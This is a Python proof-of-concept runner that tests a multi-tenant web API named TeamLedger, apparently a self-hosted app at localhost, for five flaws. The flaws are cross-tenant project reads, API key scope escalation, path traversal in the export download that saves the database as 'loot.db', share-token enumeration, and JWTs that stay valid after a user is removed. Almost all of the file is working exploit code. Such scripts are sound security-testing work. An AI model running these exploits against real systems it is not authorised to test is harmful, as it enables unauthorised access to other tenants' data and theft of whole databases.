import requests
import json
import time
import random
import string

BASE = "http://localhost:8000/api/v1"

session = requests.Session()

# -----------------------------
# Utilities
# -----------------------------

def randmail():
    return f"user{random.randint(10000,99999)}@test.com"

def register(email):
    r = session.post(f"{BASE}/auth/register", json={
        "email": email,
        "password": "pass1234",
        "full_name": email
    })
    return r.ok

def login(email):
    r = session.post(
        f"{BASE}/auth/login",
        data={"username": email, "password": "pass1234"},
        headers={"Content-Type":"application/x-www-form-urlencoded"}
    )
    return r.json()["data"]["access_token"]

def auth_headers(token):
    return {"Authorization": f"Bearer {token}"}

def create_org(token, name):
    r = session.post(f"{BASE}/organizations/",
                     headers=auth_headers(token),
                     json={"name": name})
    return r.json()["data"]["id"]

def switch_org(token, org_id):
    r = session.post(f"{BASE}/organizations/{org_id}/switch",
                     headers=auth_headers(token))
    return r.json()["data"]["access_token"]

def create_project(token, name="proj"):
    r = session.post(f"{BASE}/projects/",
                     headers=auth_headers(token),
                     json={"name": name})
    return r.json()["data"]["id"]

def create_note(token, project_id, content="hello"):
    r = session.post(f"{BASE}/notes/?project_id={project_id}",
                     headers=auth_headers(token),
                     json={"title":"note","content":content})
    return r.json()["data"]["id"]

# -------------------------------------------------
# PoC 1 — Cross Tenant Project Read
# -------------------------------------------------

def poc_cross_tenant():
    print("\n[+] Running Cross-Tenant Access PoC")

    # attacker 1
    u1 = randmail()
    register(u1)
    t1 = login(u1)
    org1 = create_org(t1, "A")
    t1 = switch_org(t1, org1)
    project = create_project(t1, "secret-project")

    # attacker 2
    u2 = randmail()
    register(u2)
    t2 = login(u2)
    org2 = create_org(t2, "B")
    t2 = switch_org(t2, org2)

    r = session.get(f"{BASE}/projects/{project}", headers=auth_headers(t2))

    if r.ok and "name" in r.text:
        print("[!!!] VULNERABLE: Cross tenant project accessible")
    else:
        print("[OK] Not vulnerable")

# -------------------------------------------------
# PoC 2 — API Key Scope Escalation
# -------------------------------------------------

def poc_api_scope():
    print("\n[+] Running API Key Scope Escalation")

    u = randmail()
    register(u)
    t = login(u)
    org = create_org(t,"scopeorg")
    t = switch_org(t,org)
    project = create_project(t)
    note = create_note(t, project)

    # create read key
    r = session.post(f"{BASE}/api-keys/",
                     headers=auth_headers(t),
                     json={"name":"rk","scopes":"read"})
    key = r.json()["data"]["key"]

    # try to update note
    r = session.put(f"{BASE}/notes/{note}?project_id={project}",
                    headers={"X-API-Key":key},
                    json={"content":"owned"})

    if r.ok:
        print("[!!!] VULNERABLE: Read-only API key modified note")
    else:
        print("[OK] Not vulnerable")

# -------------------------------------------------
# PoC 3 — Export Path Traversal
# -------------------------------------------------

def poc_export_read():
    print("\n[+] Running Export Arbitrary File Read")

    u = randmail()
    register(u)
    t = login(u)
    org = create_org(t,"exporg")
    t = switch_org(t,org)
    project = create_project(t)

    r = session.post(f"{BASE}/projects/{project}/export",
                     headers=auth_headers(t))
    job = r.json()["data"]["id"]

    print("[*] Waiting for export job...")
    time.sleep(5)

    r = session.get(f"{BASE}/jobs/{job}/download?path=../../teamledger.db",
                    headers=auth_headers(t))

    if r.ok and len(r.content) > 1000:
        open("loot.db","wb").write(r.content)
        print("[!!!] VULNERABLE: database downloaded as loot.db")
    else:
        print("[OK] Not vulnerable")

# -------------------------------------------------
# PoC 4 — Shared Note Prediction
# -------------------------------------------------

def poc_shared_prediction():
    print("\n[+] Running Share Token Prediction")

    u = randmail()
    register(u)
    t = login(u)
    org = create_org(t,"shareorg")
    t = switch_org(t,org)
    project = create_project(t)

    note = create_note(t,project)

    r = session.post(f"{BASE}/notes/{note}/share?project_id={project}",
                     headers=auth_headers(t))
    token = r.json()["data"]["share_token"]

    prefix = token[:-1]
    print("[*] Token sample:",token)
    print("[*] Attempting enumeration...")

    for c in string.ascii_lowercase:
        guess = prefix + c
        r = session.get(f"{BASE}/notes/shared/{guess}")
        if r.ok and "title" in r.text:
            print("[!!!] VULNERABLE: predicted valid token:",guess)
            return

    print("[OK] No prediction success")

# -------------------------------------------------
# PoC 5 — JWT Revocation Failure
# -------------------------------------------------

def poc_jwt_revocation():
    print("\n[+] Running JWT Revocation Test")

    owner = randmail()
    attacker = randmail()

    register(owner)
    register(attacker)

    t_owner = login(owner)
    org = create_org(t_owner,"jwtorg")
    t_owner = switch_org(t_owner,org)

    invite = session.post(f"{BASE}/organizations/{org}/invite",
                          headers=auth_headers(t_owner)).json()["data"]["invite_token"]

    t_attacker = login(attacker)
    session.post(f"{BASE}/organizations/join",
                 headers=auth_headers(t_attacker),
                 json={"invite_token":invite})

    t_attacker = switch_org(t_attacker,org)

    old_token = t_attacker

    # owner would remove attacker here manually if endpoint differs

    print("[*] Use UI/API to remove attacker from org, then press ENTER")
    input()

    r = session.get(f"{BASE}/projects/",
                    headers=auth_headers(old_token))

    if r.ok:
        print("[!!!] VULNERABLE: Removed user still accesses org")
    else:
        print("[OK] Revocation works")

# -------------------------------------------------
# Menu
# -------------------------------------------------

def menu():
    while True:
        print("""
==== TeamLedger PoC Runner ====

1. Cross-Tenant Project Access
2. API Key Scope Escalation
3. Export Arbitrary File Read
4. Shared Token Prediction
5. JWT Revocation Failure
0. Exit
""")
        choice = input("Select: ")

        if choice=="1": poc_cross_tenant()
        elif choice=="2": poc_api_scope()
        elif choice=="3": poc_export_read()
        elif choice=="4": poc_shared_prediction()
        elif choice=="5": poc_jwt_revocation()
        elif choice=="0": break

if __name__ == "__main__":
    menu()